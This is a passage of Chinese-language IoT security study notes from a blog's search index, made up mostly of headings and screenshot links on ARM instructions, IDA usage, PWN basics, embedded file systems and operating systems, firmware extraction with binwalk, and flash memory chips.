alt="image-20241013151054933"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131511289.png" alt="image-20241013151103241"></p><h5 id="加载-x2F-存储指令"><a href="#加载-x2F-存储指令" class="headerlink" title="加载&#x2F;存储指令"></a>加载&#x2F;存储指令</h5><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131511989.png" alt="image-20241013151113938"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131511350.png" alt="image-20241013151129254"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131511571.png" alt="image-20241013151144493"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131511437.png" alt="image-20241013151155383"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131512085.png" alt="image-20241013151222017"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131512727.png" alt="image-20241013151234656"></p><p> <img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131513525.png" alt="image-20241013151300471"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131513628.png" alt="image-20241013151312585"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131513947.png" alt="image-20241013151333875"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131513027.png" alt="image-20241013151353949"></p><h5 id="异常产生指令"><a href="#异常产生指令" class="headerlink" title="异常产生指令"></a>异常产生指令</h5><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131514202.png" alt="image-20241013151404144"></p><h5 id="伪代码"><a href="#伪代码" class="headerlink" title="伪代码"></a>伪代码</h5><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131514872.png" alt="image-20241013151419819"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131514995.png" alt="image-20241013151429929"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131514914.png" alt="image-20241013151459847"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131515146.png" alt="image-20241013151528107"></p><h5 id="环境搭建kali"><a href="#环境搭建kali" class="headerlink" title="环境搭建kali"></a>环境搭建kali</h5><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131515167.png" alt="image-20241013151554116"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131516030.png" alt="image-20241013151604979"></p><h4 id="ARM环境搭建"><a href="#ARM环境搭建" class="headerlink" title="ARM环境搭建"></a>ARM环境搭建</h4><h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><h2 id="静态分析篇"><a href="#静态分析篇" class="headerlink" title="静态分析篇"></a>静态分析篇</h2><h3 id="IDA反汇编窗口"><a href="#IDA反汇编窗口" class="headerlink" title="IDA反汇编窗口"></a>IDA反汇编窗口</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131904779.png" alt="image-20241013190443653"></p><h3 id="IDA伪代码窗口"><a href="#IDA伪代码窗口" class="headerlink" title="IDA伪代码窗口"></a>IDA伪代码窗口</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131516456.png" alt="image-20241013151637361"></p><h3 id="IDA的字符串表"><a href="#IDA的字符串表" class="headerlink" title="IDA的字符串表"></a>IDA的字符串表</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131516762.png" alt="image-20241013151648676"></p><h3 id="IDA数据窗口"><a href="#IDA数据窗口" class="headerlink" title="IDA数据窗口"></a>IDA数据窗口</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131517102.png" alt="image-20241013151702014"></p><h3 id="IDA交叉引用"><a href="#IDA交叉引用" class="headerlink" title="IDA交叉引用"></a>IDA交叉引用</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131517554.png" alt="image-20241013151714404"></p><h3 id="IDA的代码定位"><a href="#IDA的代码定位" class="headerlink" title="IDA的代码定位"></a>IDA的代码定位</h3><h4 id="寻找main函数"><a href="#寻找main函数" class="headerlink" title="寻找main函数"></a>寻找main函数</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131517816.png" alt="image-20241013151733751"></p><h3 id="快捷键总结"><a href="#快捷键总结" class="headerlink" title="快捷键总结"></a>快捷键总结</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131517860.png" alt="image-20241013151745755"></p><h3 id="不同类型的整数"><a href="#不同类型的整数" class="headerlink" title="不同类型的整数"></a>不同类型的整数</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131517516.png" alt="image-20241013151759418"></p><h3 id="LazyIDA提取数据"><a href="#LazyIDA提取数据" class="headerlink" title="LazyIDA提取数据"></a>LazyIDA提取数据</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131519446.png" alt="image-20241013151905313"></p><h3 id="数据与代码的转换"><a href="#数据与代码的转换" class="headerlink" title="数据与代码的转换"></a>数据与代码的转换</h3><h2 id="动态调试篇"><a href="#动态调试篇" class="headerlink" title="动态调试篇"></a>动态调试篇</h2><h2 id="IDA疑难杂症"><a href="#IDA疑难杂症" class="headerlink" title="IDA疑难杂症"></a>IDA疑难杂症</h2><h2 id="IDA脚本编程"><a href="#IDA脚本编程" class="headerlink" title="IDA脚本编程"></a>IDA脚本编程</h2><h2 id="C-逆向"><a href="#C-逆向" class="headerlink" title="C++逆向"></a>C++逆向</h2><h2 id="结构体数组类型修复"><a href="#结构体数组类型修复" class="headerlink" title="结构体数组类型修复"></a>结构体数组类型修复</h2><h2 id="综合实战"><a href="#综合实战" class="headerlink" title="综合实战"></a>综合实战</h2><h1 id="PWN基础"><a href="#PWN基础" class="headerlink" title="PWN基础"></a>PWN基础</h1><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131721520.png" alt="image-20241013172111402"></p><h3 id="常见PWN漏洞"><a href="#常见PWN漏洞" class="headerlink" title="常见PWN漏洞"></a>常见PWN漏洞</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131723421.png" alt="image-20241013172357342"></p><h3 id="PWN基础讲解"><a href="#PWN基础讲解" class="headerlink" title="PWN基础讲解"></a>PWN基础讲解</h3><h4 id="linux内存布局"><a href="#linux内存布局" class="headerlink" title="linux内存布局"></a>linux内存布局</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131728709.png" alt="image-20241013172810608"></p><blockquote><p>堆比栈大很多</p></blockquote><h4 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131734249.png" alt="image-20241013173428140"></p><blockquote><p>nx保护</p></blockquote><h4 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131738017.png" alt="image-20241013173834841"></p><h3 id="PWN环境搭建"><a href="#PWN环境搭建" class="headerlink" title="PWN环境搭建"></a>PWN环境搭建</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131741739.png" alt="image-20241013174113622"></p><h2 id="PWN工具"><a href="#PWN工具" class="headerlink" title="PWN工具"></a>PWN工具</h2><h3 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131749972.png" alt="image-20241013174939885"></p><blockquote><p>gdg的插件</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131749230.png" alt="image-20241013174951104"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131750559.png" alt="image-20241013175003452"></p><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131750197.png" alt="image-20241013175035104"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131750681.png" alt="image-20241013175048593"></p><h1 id="固件层安全"><a href="#固件层安全" class="headerlink" title="固件层安全"></a>固件层安全</h1><h2 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h2><h3 id="文件系统简介"><a href="#文件系统简介" class="headerlink" title="文件系统简介"></a>文件系统简介</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131519154.png" alt="image-20241013151937075"></p><h4 id="根文件系统"><a href="#根文件系统" class="headerlink" title="根文件系统"></a>根文件系统</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131519764.png" alt="image-20241013151955699"></p><h4 id="嵌入式文件系统"><a href="#嵌入式文件系统" class="headerlink" title="嵌入式文件系统"></a>嵌入式文件系统</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131520444.png" alt="image-20241013152009375"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131520068.png" alt="image-20241013152018986"></p><h3 id="常见的文件系统"><a href="#常见的文件系统" class="headerlink" title="常见的文件系统"></a>常见的文件系统</h3><h4 id="jffs"><a href="#jffs" class="headerlink" title="jffs"></a>jffs</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131520467.png" alt="image-20241013152030370"></p><h4 id="cramfs"><a href="#cramfs" class="headerlink" title="cramfs"></a>cramfs</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131520743.png" alt="image-20241013152047637"></p><h4 id="squashfs"><a href="#squashfs" class="headerlink" title="squashfs"></a>squashfs</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131521111.png" alt="image-20241013152101978"></p><h4 id="ubifs"><a href="#ubifs" class="headerlink" title="ubifs"></a>ubifs</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131531465.png" alt="image-20241013153102365"></p><h4 id="ramdisk"><a href="#ramdisk" class="headerlink" title="ramdisk"></a>ramdisk</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131521356.png" alt="image-20241013152134254"></p><h4 id="ramfs"><a href="#ramfs" class="headerlink" title="ramfs"></a>ramfs</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131521007.png" alt="image-20241013152144901"></p><h4 id="nfs"><a href="#nfs" class="headerlink" title="nfs"></a>nfs</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131521487.png" alt="image-20241013152158421"></p><h4 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131522037.png" alt="image-20241013152211925"></p><h4 id="tmpfs"><a href="#tmpfs" class="headerlink" title="tmpfs"></a>tmpfs</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131522626.png" alt="image-20241013152249532"></p><h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><h3 id="操作系统简介"><a href="#操作系统简介" class="headerlink" title="操作系统简介"></a>操作系统简介</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131523683.png" alt="image-20241013152304616"></p><h3 id="操作系统的作用"><a href="#操作系统的作用" class="headerlink" title="操作系统的作用"></a>操作系统的作用</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131523408.png" alt="image-20241013152315345"></p><h3 id="操作系统的分类"><a href="#操作系统的分类" class="headerlink" title="操作系统的分类"></a>操作系统的分类</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131523521.png" alt="image-20241013152328447"></p><h2 id="嵌入式操作系统"><a href="#嵌入式操作系统" class="headerlink" title="嵌入式操作系统"></a>嵌入式操作系统</h2><h3 id="分时操作系统"><a href="#分时操作系统" class="headerlink" title="分时操作系统"></a>分时操作系统</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131523393.png" alt="image-20241013152340318"></p><h3 id="linux操作系统"><a href="#linux操作系统" class="headerlink" title="linux操作系统"></a>linux操作系统</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131523644.png" alt="image-20241013152353548"></p><h4 id="linux目录结构"><a href="#linux目录结构" class="headerlink" title="linux目录结构"></a>linux目录结构</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131524873.png" alt="image-20241013152407815"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131524401.png" alt="image-20241013152418332"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131524369.png" alt="image-20241013152433298"></p><h4 id="linux镜像"><a href="#linux镜像" class="headerlink" title="linux镜像"></a>linux镜像</h4><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131524756.png" alt="image-20241013152454692"></p><h3 id="实时操作系统"><a href="#实时操作系统" class="headerlink" title="实时操作系统"></a>实时操作系统</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131530864.png" alt="image-20241013153040807"></p><h3 id="RTOS操作系统"><a href="#RTOS操作系统" class="headerlink" title="RTOS操作系统"></a>RTOS操作系统</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131525326.png" alt="image-20241013152502276"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131525707.png" alt="image-20241013152518649"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131525411.png" alt="image-20241013152528363"></p><h3 id="VxWorks操作系统"><a href="#VxWorks操作系统" class="headerlink" title="VxWorks操作系统"></a>VxWorks操作系统</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131525349.png" alt="image-20241013152539283"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131525444.png" alt="image-20241013152551374"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131526751.png" alt="image-20241013152602702"></p><h2 id="固件"><a href="#固件" class="headerlink" title="固件"></a>固件</h2><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131526437.png" alt="image-20241013152615304"></p><h2 id="固件获取"><a href="#固件获取" class="headerlink" title="固件获取"></a>固件获取</h2><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131526692.png" alt="image-20241013152623593"></p><h3 id="官网下载"><a href="#官网下载" class="headerlink" title="官网下载"></a>官网下载</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131526158.png" alt="image-20241013152637070"></p><h3 id="第三方购买"><a href="#第三方购买" class="headerlink" title="第三方购买"></a>第三方购买</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131526875.png" alt="image-20241013152655824"></p><h3 id="升级，抓包"><a href="#升级，抓包" class="headerlink" title="升级，抓包"></a>升级，抓包</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131527337.png" alt="image-20241013152709256"></p><h3 id="上位机软件"><a href="#上位机软件" class="headerlink" title="上位机软件"></a>上位机软件</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131527845.png" alt="image-20241013152721771"></p><h3 id="flash内存读取"><a href="#flash内存读取" class="headerlink" title="flash内存读取"></a>flash内存读取</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131527425.png" alt="image-20241013152736323"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131527566.png" alt="image-20241013152749390"></p><h3 id="调试接口"><a href="#调试接口" class="headerlink" title="调试接口"></a>调试接口</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131528377.png" alt="image-20241013152809312"></p><h3 id="逻辑分析仪"><a href="#逻辑分析仪" class="headerlink" title="逻辑分析仪"></a>逻辑分析仪</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131528965.png" alt="image-20241013152819870"></p><h2 id="固件提取"><a href="#固件提取" class="headerlink" title="固件提取"></a>固件提取</h2><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131528348.png" alt="image-20241013152836267"></p><h3 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131528435.png" alt="image-20241013152848333"></p><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131528595.png" alt="image-20241013152859505"></p><h3 id="hexdump"><a href="#hexdump" class="headerlink" title="hexdump"></a>hexdump</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131529113.png" alt="image-20241013152917037"></p><h3 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131529239.png" alt="image-20241013152934153"></p><p>查看是否加密</p><p>binwalk -E</p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131529451.png" alt="image-20241013152946383"></p><p>递归提取</p><p>binwalk -Me</p><h3 id="dd"><a href="#dd" class="headerlink" title="dd"></a>dd</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131529680.png" alt="image-20241013152957593"></p><h3 id="fdisk"><a href="#fdisk" class="headerlink" title="fdisk"></a>fdisk</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131530341.png" alt="image-20241013153009271"></p><h1 id="硬件安全"><a href="#硬件安全" class="headerlink" title="硬件安全"></a>硬件安全</h1><h2 id="硬件简介"><a href="#硬件简介" class="headerlink" title="硬件简介"></a>硬件简介</h2><h3 id="物联网硬件"><a href="#物联网硬件" class="headerlink" title="物联网硬件"></a>物联网硬件</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131228324.png" alt="image-20241013122802206"></p><h3 id="物联网硬件组成"><a href="#物联网硬件组成" class="headerlink" title="物联网硬件组成"></a>物联网硬件组成</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131228514.png" alt="image-20241013122829457"></p><h3 id="印刷电路板"><a href="#印刷电路板" class="headerlink" title="印刷电路板"></a>印刷电路板</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131228633.png" alt="image-20241013122849533"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131229895.png" alt="image-20241013122903794"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131229093.png" alt="image-20241013122917018"></p><h3 id="ROM"><a href="#ROM" class="headerlink" title="ROM"></a>ROM</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131231345.png" alt="image-20241013123134242"></p><h3 id="RAM"><a href="#RAM" class="headerlink" title="RAM"></a>RAM</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131231149.png" alt="image-20241013123149057"></p><h3 id="Flash"><a href="#Flash" class="headerlink" title="Flash"></a>Flash</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131232606.png" alt="image-20241013123206511"></p><h3 id="ROM的种类"><a href="#ROM的种类" class="headerlink" title="ROM的种类"></a>ROM的种类</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131234459.png" alt="image-20241013123406410"></p><h3 id="ROM物理"><a href="#ROM物理" class="headerlink" title="ROM物理"></a>ROM物理</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131234537.png" alt="image-20241013123428476"></p><h3 id="RAM种类"><a href="#RAM种类" class="headerlink" title="RAM种类"></a>RAM种类</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131235493.png" alt="image-20241013123521412"></p><h3 id="RAM物理"><a href="#RAM物理" class="headerlink" title="RAM物理"></a>RAM物理</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131235374.png" alt="image-20241013123539296"></p><h3 id="Flash种类"><a href="#Flash种类" class="headerlink" title="Flash种类"></a>Flash种类</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131236512.png" alt="image-20241013123632449"></p><blockquote><p>一般老说nor更快，nand更大</p></blockquote><h3 id="NOR-Flash"><a href="#NOR-Flash" class="headerlink" title="NOR Flash"></a>NOR Flash</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131236254.png" alt="image-20241013123646178"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131236345.png" alt="image-20241013123656289"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131237905.png" alt="image-20241013123712812"></p><h3 id="NAND-Flash"><a href="#NAND-Flash" class="headerlink" title="NAND Flash"></a>NAND Flash</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131237883.png" alt="image-20241013123744820"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131237797.png" alt="image-20241013123755716"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131238869.png" alt="image-20241013123804814"></p><h3 id="EMMC"><a href="#EMMC" class="headerlink" title="EMMC"></a>EMMC</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131238974.png" alt="image-20241013123842894"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131238094.png" alt="image-20241013123857006"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131239100.png" alt="image-20241013123910036"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131239582.png" alt="image-20241013123918534"></p><h2 id="芯片识别网站"><a href="#芯片识别网站" class="headerlink" title="芯片识别网站"></a>芯片识别网站</h2><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131239825.png" alt="image-20241013123928704"></p><h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><h3 id="蓝牙模块"><a href="#蓝牙模块" class="headerlink" title="蓝牙模块"></a>蓝牙模块</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131239331.png" alt="image-20241012215226266"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410131239321.png" alt="image-20241013123954270"></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
